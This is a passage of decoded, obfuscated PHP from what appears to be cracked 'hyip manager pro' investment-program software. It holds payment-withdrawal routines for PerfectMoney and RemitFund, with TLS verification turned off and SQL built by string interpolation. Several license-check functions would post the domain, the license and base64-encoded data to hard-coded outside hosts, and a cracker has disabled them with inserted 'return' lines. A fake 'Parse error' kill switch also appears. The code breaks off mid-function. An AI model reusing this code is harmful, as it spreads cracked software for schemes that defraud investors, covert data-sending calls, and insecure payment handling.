        if ( ( $elnlclMnD = stristr( $elnlcDUcm, "<failed>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcwlQb = strlen( $elnlcDUcm ) - strlen( $elnlclMnD );
        }
        if ( ( $elnlcpQHQ = stristr( $elnlcDUcm, "</failed>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcOqPq = strlen( $elnlcDUcm ) - strlen( $elnlcpQHQ );
        }
        if ( $elnlcyCGoN )
        {
            break;
        }
        else
        {
            $elnlcfPoc = trim( substr( $elnlcDUcm, $elnlcwlQb + 13, $elnlcOqPq - 13 ) );
            $elnlcDUcm = trim( substr( $elnlcDUcm, $elnlcOqPq + 14 ) );
            $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = elnlcskkt( $elnlcfPoc, "error" );
        }
        if ( ( $elnlclMnD = stristr( $elnlcDUcm, "<failed>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcwlQb = strlen( $elnlcDUcm ) - strlen( $elnlclMnD );
        }
        if ( ( $elnlcpQHQ = stristr( $elnlcDUcm, "</failed>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcOqPq = strlen( $elnlcDUcm ) - strlen( $elnlcpQHQ );
        }
    }
    $elnlcCqQy = elnlcskkt( $elnlcuHrM, "errorresponse.list" );
    if ( $elnlcCqQy != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcdvIfH'];
        $elnlcyCGoN = false;
        if ( ( $elnlclMnD = stristr( $elnlcCqQy, "<errorresponse>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcwlQb = strlen( $elnlcCqQy ) - strlen( $elnlclMnD );
        }
        if ( ( $elnlcpQHQ = stristr( $elnlcCqQy, "</errorresponse>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcOqPq = strlen( $elnlcCqQy ) - strlen( $elnlcpQHQ );
        }
        if ( $elnlcyCGoN )
        {
            break;
        }
        else
        {
            $elnlccGJLR = trim( substr( $elnlcCqQy, $elnlcwlQb + 15, $elnlcOqPq - 15 ) );
            $elnlcSnSm = false;
        }
        if ( ( $elnlcgKVk = stristr( $elnlccGJLR, "<error>" ) ) === false )
        {
            $elnlcSnSm = true;
        }
        else
        {
            $elnlcnmlyC = strlen( $elnlccGJLR ) - strlen( $elnlcgKVk );
        }
        if ( ( $elnlcduCs = stristr( $elnlccGJLR, "</error>" ) ) === false )
        {
            $elnlcSnSm = true;
        }
        else
        {
            $elnlcJOwOq = strlen( $elnlccGJLR ) - strlen( $elnlcduCs );
        }
        while ( !$elnlcSnSm )
        {
            $elnlcAhtVm = trim( substr( $elnlccGJLR, $elnlcnmlyC + 7, $elnlcJOwOq - 7 ) );
            $elnlccGJLR = trim( substr( $elnlccGJLR, $elnlcJOwOq + 8 ) );
            $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = elnlcskkt( $elnlcAhtVm, "text" );
            $elnlcVRAGE[$elnlcbhAzL['elnlcARIU']] = elnlcskkt( $elnlcAhtVm, "additional" );
            if ( ( $elnlcgKVk = stristr( $elnlccGJLR, "<error>" ) ) === false )
            {
                $elnlcSnSm = true;
            }
            else
            {
                $elnlcnmlyC = strlen( $elnlccGJLR ) - strlen( $elnlcgKVk );
            }
            if ( ( $elnlcduCs = stristr( $elnlccGJLR, "</error>" ) ) === false )
            {
                $elnlcSnSm = true;
            }
            else
            {
                $elnlcJOwOq = strlen( $elnlccGJLR ) - strlen( $elnlcduCs );
            }
        }
        $elnlcCqQy = trim( substr( $elnlcCqQy, $elnlcOqPq + 16 ) );
        if ( ( $elnlclMnD = stristr( $elnlcCqQy, "<errorresponse>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcwlQb = strlen( $elnlcCqQy ) - strlen( $elnlclMnD );
        }
        if ( ( $elnlcpQHQ = stristr( $elnlcCqQy, "</errorresponse>" ) ) === false )
        {
            $elnlcyCGoN = true;
        }
        else
        {
            $elnlcOqPq = strlen( $elnlcCqQy ) - strlen( $elnlcpQHQ );
        }
    }
    return $elnlcVRAGE;
}

function elnlcimbl( $elnlcKIydR, $elnlcrxAoG )
{
    global $elnlcbhAzL;
    $elnlcpyHQN = strlen( $elnlcrxAoG ) + 2;
    $elnlcJQCK = strpos( $elnlcKIydR, "<{$elnlcrxAoG} " );
    $elnlccRxLS = strpos( $elnlcKIydR, "<{$elnlcrxAoG}>" );
    if ( $elnlcJQCK !== false )
    {
        $elnlcwlQb = $elnlcJQCK;
    }
    if ( $elnlccRxLS !== false )
    {
        $elnlcwlQb = $elnlccRxLS;
    }
    if ( $elnlcwlQb === false )
    {
        return "";
    }
    if ( ( $elnlcOqPq = strpos( $elnlcKIydR, "</{$elnlcrxAoG}>" ) ) === false )
    {
        return "";
    }
    $elnlcvCERW = strpos( $elnlcKIydR, ">", $elnlcwlQb );
    $elnlcKQtm = trim( substr( $elnlcKIydR, $elnlcvCERW + 1, $elnlcOqPq - ( $elnlcwlQb + $elnlcpyHQN ) ) );
    return $elnlcKQtm;
}

function elnlckgqti( $elnlcuHrM )
{
    global $elnlcbhAzL;
    $elnlcVRAGE = array( );
    $elnlcGrmU = elnlcimbl( $elnlcuHrM, "Receipt" );
    if ( $elnlcGrmU != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcgyewH'];
        $elnlcvzPA = $elnlcGrmU;
        $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] = elnlcimbl( $elnlcvzPA, "ReceiptId" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcdMRao']] = elnlcimbl( $elnlcvzPA, "Payer" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcnhDqm']] = elnlcimbl( $elnlcvzPA, "Payee" );
        $elnlctaCCe = elnlcimbl( $elnlcvzPA, "Equivalent" );
        $elnlcVRAGE[$elnlcbhAzL['elnlclEcuA']] = elnlcimbl( $elnlctaCCe, "Amount" );
        $elnlcVRAGE[$elnlcbhAzL['elnlclmhFR']] = elnlcimbl( $elnlctaCCe, "CurrencyId" );
    }
    $elnlcCqQy = elnlcimbl( $elnlcuHrM, "ErrorResponse" );
    if ( $elnlcCqQy != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcdvIfH'];
        $elnlcAhtVm = $elnlcCqQy;
        $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = elnlcimbl( $elnlcAhtVm, "Text" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcARIU']] = elnlcimbl( $elnlcAhtVm, "Additional" );
    }
    return $elnlcVRAGE;
}

function elnlcpijq( $elnlcuHrM )
{
    global $elnlcbhAzL;
    $elnlcVRAGE = array( );
    $elnlcGrmU = elnlcimbl( $elnlcuHrM, "Receipt" );
    if ( $elnlcGrmU != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcgyewH'];
        $elnlcvzPA = $elnlcGrmU;
        $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] = elnlcimbl( $elnlcvzPA, "ReceiptId" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcdMRao']] = elnlcimbl( $elnlcvzPA, "Payer" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcnhDqm']] = elnlcimbl( $elnlcvzPA, "Payee" );
        $elnlcVRAGE[$elnlcbhAzL['elnlclEcuA']] = elnlcimbl( $elnlcvzPA, "Amount" );
        $elnlcVRAGE[$elnlcbhAzL['elnlclmhFR']] = elnlcimbl( $elnlcvzPA, "CurrencyId" );
    }
    $elnlcCqQy = elnlcimbl( $elnlcuHrM, "Balance" );
    if ( $elnlcCqQy != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcgyewH'];
        $elnlcAhtVm = $elnlcCqQy;
        $elnlcVRAGE[$elnlcbhAzL['elnlcKMbdy']] = elnlcimbl( $elnlcAhtVm, "Value" );
    }
    $elnlcCqQy = elnlcimbl( $elnlcuHrM, "Error" );
    if ( $elnlcCqQy != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcdvIfH'];
        $elnlcAhtVm = $elnlcCqQy;
        $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = elnlcimbl( $elnlcAhtVm, "Text" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcARIU']] = elnlcimbl( $elnlcAhtVm, "Description" );
    }
    return $elnlcVRAGE;
}

function elnlcojdm( $elnlcuHrM )
{
    global $elnlcbhAzL;
    $elnlcVRAGE = array( );
    $elnlcGrmU = elnlcimbl( $elnlcuHrM, "Status" );
    if ( elnlcimbl( $elnlcGrmU, "Code" ) == $elnlcbhAzL['elnlcFIMb'] )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcgyewH'];
    }
    else
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcdvIfH'];
        $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = elnlcimbl( $elnlcuHrM, "Message" );
    }
    $elnlcRdxq = elnlcimbl( $elnlcuHrM, "Balance" );
    if ( $elnlcRdxq != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcKMbdy']] = $elnlcRdxq;
    }
    $elnlcGrmU = elnlcimbl( $elnlcuHrM, "Transfer" );
    if ( $elnlcGrmU != "" )
    {
        $elnlcVRAGE[$elnlcbhAzL['elnlcdMRao']] = elnlcimbl( $elnlcGrmU, "Payer" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcnhDqm']] = elnlcimbl( $elnlcGrmU, "Payee" );
        $elnlcVRAGE[$elnlcbhAzL['elnlclEcuA']] = elnlcimbl( $elnlcGrmU, "Amount" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcwuVzl']] = elnlcimbl( $elnlcGrmU, "Memo" );
        $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] = elnlcimbl( $elnlcGrmU, "Batch" );
        $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = elnlcimbl( $elnlcGrmU, "Message" );
    }
    return $elnlcVRAGE;
}

function elnlcwrhd( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( !( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] ) || $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to PerfectMoney account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid PerfectMoney account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 18 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 18 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='perfectmoney_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcmfGp = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            $elnlcMhFzb = preg_split( "/\\|/", $elnlcDxIpr )[1];
            $elnlcmfGp = preg_split( "/\\|/", $elnlcDxIpr )[0];
            $elnlctVnzQ[$elnlcbhAzL['elnlcFtOIH']] = $elnlcMhFzb;
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcykqSE = rawurlencode( $elnlcykqSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://www.perfectmoney.com/acct/confirm.asp" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, "AccountID=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlceaRU']] )."&PassPhrase=".rawurlencode( $elnlcmfGp )."&Payer_Account=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlcFtOIH']] )."&Payee_Account=".rawurlencode( $elnlcJfxRK )."&Amount=".rawurlencode( $elnlcekLao )."&Memo={$elnlcykqSE}" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcQwChW = array( );
        if ( preg_match( "/<input name='PAYMENT_BATCH_NUM' type='hidden' value='(\\d+)'>/ims", $a, $elnlcQwChW ) )
        {
            return array( 1, "", $elnlcQwChW[1] );
        }
        else
        {
            if ( preg_match( "/<input name='ERROR' type='hidden' value=\\'(.*?)\\'>/ims", $a, $elnlcQwChW ) )
            {
                $elnlcGwtr = preg_replace( "/&lt;/i", "<", $elnlcQwChW[1] );
                $elnlcGwtr = preg_replace( "/&gt;/i", ">", $elnlcGwtr );
                $e = elnlcdjxb( "{$elnlcstWo} {$elnlcGwtr}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." {$elnlcGwtr}", "" );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Unknown error" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." Unknown error", "" );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlczjasw( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty RemitFund account.'";
        mysql_query( $q );
        return array( 0, "Invalid RemintFund account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 25 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 25 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='remitfund_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcsoAV = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
            $elnlcmlGeT = $elnlctVnzQ[$elnlcbhAzL['elnlcgxDs']];
        }
        else
        {
            $elnlcmlGeT = preg_split( "/\\|/", $elnlcDxIpr )[1];
            $elnlcsoAV = preg_split( "/\\|/", $elnlcDxIpr )[0];
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcuLEl = strtoupper( md5( "{$elnlcmlGeT}transferUSD{$elnlctVnzQ[$elnlcbhAzL['elnlcGustD']]}{$elnlcJfxRK}{$elnlcekLao}".strtoupper( md5( $elnlcsoAV ) ) ) );
        $elnlcKIydR = "<TransferRequest>\r\n  <Auth>\r\n    <ApiName>".htmlspecialchars( $elnlcmlGeT )."</ApiName>\r\n    <Token>{$elnlcuLEl}</Token>\r\n  </Auth>\r\n  <Transfer>\r\n    <TransferId></TransferId>\r\n    <TransferType>transfer</TransferType>\r\n    <Payer>".htmlentities( $elnlctVnzQ[$elnlcbhAzL['elnlcGustD']], ENT_NOQUOTES )."</Payer>\r\n    <Payee>".htmlentities( $elnlcJfxRK, ENT_NOQUOTES )."</Payee>\r\n    <CurrencyId>USD</CurrencyId>\r\n    <Amount>".htmlentities( $elnlcekLao, ENT_NOQUOTES )."</Amount>\r\n    <Memo>".htmlentities( $elnlcykqSE, ENT_NOQUOTES )."</Memo>\r\n  </Transfer>\r\n</TransferRequest>";
        $elnlcVCFRQ = curl_init( );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://www.remitfund.com/xml/api.php?req=".urlencode( $elnlcKIydR ) );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $elnlciipfT = array( "User-Agent: Mozilla/5.0" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_HTTPHEADER, $elnlciipfT );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcVRAGE = elnlcsnvq( $a );
        if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcJdcEW'] )
        {
            return array( 1, "", $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] );
        }
        else
        {
            if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcMcIo'] )
            {
                $e = elnlcdjxb( "{$elnlcstWo} ".$elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcsnvq( $elnlcuHrM )
{
    global $elnlcbhAzL;
    $elnlcVRAGE = array( );
    $elnlcGrmU = elnlcimbl( $elnlcuHrM, "Response" );
    if ( $elnlcGrmU != "" )
    {
        $elnlcvzPA = $elnlcGrmU;
        $elnlcVRAGE[$elnlcbhAzL['elnlcppGwn']] = elnlcimbl( $elnlcvzPA, "Code" );
        $elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']] = elnlcimbl( $elnlcvzPA, "Message" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] = $elnlcVRAGE[$elnlcbhAzL['elnlcppGwn']] == 0 ? "ok" : "error";
        $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] = elnlcimbl( $elnlcvzPA, "TransferId" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcdMRao']] = elnlcimbl( $elnlcvzPA, "Payer" );
        $elnlcVRAGE[$elnlcbhAzL['elnlcnhDqm']] = elnlcimbl( $elnlcvzPA, "Payee" );
        $elnlcVRAGE[$elnlcbhAzL['elnlclEcuA']] = elnlcimbl( $elnlcvzPA, "Amount" );
        $elnlcVRAGE[$elnlcbhAzL['elnlclmhFR']] = elnlcimbl( $elnlcvzPA, "Currency" );
    }
    return $elnlcVRAGE;
}

function elnlckbgo( $elnlcwIcAu, $a )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $a != "hyip manager pro 2005 jul 27" )
    {
        return elnlcyjja( $elnlcwIcAu );
    }
    $elnlcqsbxk = base64_encode( $elnlcwIcAu );
    $a = preg_split( "//", $elnlcqsbxk );
    $b = preg_split( "//", md5( $elnlcwIcAu ).base64_encode( $elnlcwIcAu ) );
    $elnlcqsbxk = "";
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < sizeof( $a ); ++$i )
    {
        if ( strlen( $a[$i] ) == 0 )
        {
            continue;
        }
        $elnlcqsbxk = $elnlcqsbxk.$a[$i].$b[$i];
    }
    $elnlcqsbxk = str_replace( "=", "!!!^", $elnlcqsbxk );
    return elnlcrcux( $elnlcqsbxk, $elnlctVnzQ[$elnlcbhAzL['elnlckWIL']], $elnlcbhAzL['elnlcBJyh'] );
}

function elnlczrwm( $elnlcwIcAu, $a )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $a != "hyip manager pro 2005 jul 27" )
    {
        return elnlcyjja( $elnlcwIcAu );
    }
    $elnlcwIcAu = str_replace( "!!!^", "=", elnlcbtyjc( $elnlcwIcAu, $elnlctVnzQ[$elnlcbhAzL['elnlckWIL']], "hyip manager pro 2005 jul 27" ) );
    $a = preg_split( "//", $elnlcwIcAu );
    $elnlcwIcAu = "";
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < sizeof( $a ); $i += 2 )
    {
        $elnlcwIcAu .= $a[$i - 1];
    }
    $elnlcqsbxk = base64_decode( $elnlcwIcAu );
    return $elnlcqsbxk;
}

function elnlcyjja( $elnlcwIcAu )
{
    global $elnlcbhAzL;
    $elnlcqsbxk = base64_encode( $elnlcwIcAu );
    $a = preg_split( "//", $elnlcqsbxk );
    $b = preg_split( "//", md5( $elnlcwIcAu ).base64_encode( $elnlcwIcAu ) );
    $elnlcqsbxk = "";
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < sizeof( $a ); ++$i )
    {
        $elnlcqsbxk = $elnlcqsbxk.$a[$i].$b[$i];
    }
    $elnlcqsbxk = str_replace( "=", "!!!^", $elnlcqsbxk );
    return $elnlcqsbxk;
}

function elnlchiwy( $elnlcwIcAu )
{
    global $elnlcbhAzL;
    $elnlcwIcAu = str_replace( "!!!^", "=", $elnlcwIcAu );
    $a = preg_split( "//", $elnlcwIcAu );
    $elnlcwIcAu = "";
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < sizeof( $a ); $i += 2 )
    {
        $elnlcwIcAu .= $a[$i - 1];
    }
    $elnlcqsbxk = base64_decode( $elnlcwIcAu );
    return $elnlcqsbxk;
}

function elnlcouany( )
{
    global $elnlcbhAzL;
    global $elnlcplSDU;
    global $elnlctVnzQ;
return;	// Added by deZender, 2010.01.30
    $elnlcnOsVl = $elnlctVnzQ[$elnlcbhAzL['elnlcgzReJ']] == 1 ? "64.27.18.142" : $elnlcbhAzL['elnlcJxuS'];
    $elnlcHHNP = @fopen( @$elnlcbhAzL['elnlcEeUB'].$elnlcnOsVl."/check.cgi?domain=".@$elnlcplSDU[$elnlcbhAzL['elnlcgdlS']]."&license=".@$elnlctVnzQ[$elnlcbhAzL['elnlccmud']]."&zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz", "r" );
    if ( $elnlcHHNP )
    {
        fclose( $elnlcHHNP );
    }
}

function elnlcmmvdg( )
{
    global $elnlcbhAzL;
    global $elnlcplSDU;
    global $elnlctVnzQ;
return;	// Added by deZender, 2010.01.30
    $l = "";
    if ( function_exists( "curl_init" ) )
    {
        $i = $elnlcbhAzL['elnlcSFKV'];
        while ( $i < 2 )
        {
            $elnlcVCFRQ = curl_init( );
            if ( $i == 1 )
            {
                $elnlcnOsVl = "64.27.18.142";
            }
            else
            {
                $elnlcnOsVl = "www.dnsargentina.com.ar";
            }
            $elnlcSoicl = "http://".$elnlcnOsVl."/check.cgi?install=1&script=3&domain=".$elnlcplSDU[$elnlcbhAzL['elnlcgdlS']]."&license=".$elnlctVnzQ[$elnlcbhAzL['elnlccmud']]."&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";
            curl_setopt( $elnlcVCFRQ, CURLOPT_URL, $elnlcSoicl );
            curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
            $l = curl_exec( $elnlcVCFRQ );
            curl_close( $elnlcVCFRQ );
            if ( $l != "" )
            {
                $i = $elnlcbhAzL['elnlccVEB'];
            }
            ++$i;
        }
    }
    if ( $l == "" )
    {
        $elnlcHHNP = @fopen( @$elnlcbhAzL['elnlcTRbe'].@$elnlcplSDU[$elnlcbhAzL['elnlcgdlS']]."&license=".@$elnlctVnzQ[$elnlcbhAzL['elnlccmud']]."&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc", "r" );
        if ( $elnlcHHNP )
        {
            $l = fread( $elnlcHHNP, 200000 );
            fclose( $elnlcHHNP );
        }
    }
    return $l;
}

function elnlcnqgrn( )
{
    global $elnlcbhAzL;
    return;
    global $elnlcplSDU;
    global $elnlctVnzQ;
    $q = "select * from hm2_users order by id limit 10";
    $elnlcRLPe = mysql_query( $q );
    if ( ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) ) && $elnlcPSitf[$elnlcbhAzL['elnlcxakjM']] == "      " )
    {
        print "<br />\n<b>Parse error</b>:  parse error in <b>".$elnlcplSDU[$elnlcbhAzL['elnlcmfrr']]."</b> on line <b>NULL</b><br />";
        exit( );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcGblxn']] == 1 )
    {
        print "<br />\n<b>Parse error</b>:  parse error in <b>".$elnlcplSDU[$elnlcbhAzL['elnlcmfrr']]."</b> on line <b>NULL</b><br />";
        exit( );
    }
}

function elnlclytuv( $elnlcVcqgw )
{
    global $elnlcbhAzL;
    global $elnlcplSDU;
    global $elnlctVnzQ;
return;	// Added by deZender, 2010.01.30
    $elnlcUGiiE = base64_encode( $elnlcVcqgw );
    $elnlcVCFRQ = curl_init( );
    $elnlcykqSE = rawurlencode( $elnlcykqSE );
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcgzReJ']] == 1 )
    {
        $elnlcnOsVl = "64.27.18.142";
    }
    else if ( $elnlctVnzQ[$elnlcbhAzL['elnlcgzReJ']] == 2 )
    {
        $elnlcnOsVl = "www.goldcodersmail.com";
    }
    else
    {
        $elnlcnOsVl = "www.dnsargentina.com.ar";
    }
    curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "http://".$elnlcnOsVl.$elnlcbhAzL['elnlcltlK'] );
    curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
    curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, "in={$elnlcUGiiE}&domain={$elnlcplSDU[$elnlcbhAzL['elnlcgdlS']]}&s=p&license={$elnlctVnzQ[$elnlcbhAzL['elnlccmud']]}" );
    curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
    $l = curl_exec( $elnlcVCFRQ );
    curl_close( $elnlcVCFRQ );
    return chop( $l );
}

function elnlcwhils( $elnlcVcqgw, $elnlchASyn = 0 )
{
    global $elnlcbhAzL;
    global $elnlcplSDU;
    global $elnlctVnzQ;
return;	// Added by deZender, 2010.01.30
    if ( $elnlchASyn == 1 )
    {
        $elnlcUGiiE = substr( trim( $elnlcVcqgw ), 0, 32 );
    }
    else
    {
        $elnlcUGiiE = base64_encode( serialize( $elnlcVcqgw ) );
    }
    $elnlcVCFRQ = curl_init( );
    $elnlcykqSE = rawurlencode( $elnlcykqSE );
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcgzReJ']] == 1 )
    {
        $elnlcnOsVl = "64.27.18.142";
    }
    else if ( $elnlctVnzQ[$elnlcbhAzL['elnlcgzReJ']] == 2 )
    {
        $elnlcnOsVl = "www.goldcodersmail.com";
    }
    else
    {
        $elnlcnOsVl = "www.dnsargentina.com.ar";
    }
    curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "http://".$elnlcnOsVl.$elnlcbhAzL['elnlcJjqT'] );
    curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
    curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, "in={$elnlcUGiiE}&mode={$elnlchASyn}&domain={$elnlcplSDU[$elnlcbhAzL['elnlcgdlS']]}&s=p&license={$elnlctVnzQ[$elnlcbhAzL['elnlccmud']]}" );
    curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
    $l = curl_exec( $elnlcVCFRQ );
    curl_close( $elnlcVCFRQ );
    if ( $elnlchASyn == 1 )
    {
        $elnlcVRAGE = array( );
        if ( $l != "nill" )
        {
            $elnlcVRAGE = unserialize( base64_decode( chop( $l ) ) );
            if ( !is_array( $elnlcVRAGE ) )
            {
                $elnlcVRAGE = array( );
            }
        }
        return $elnlcVRAGE;
    }
    else
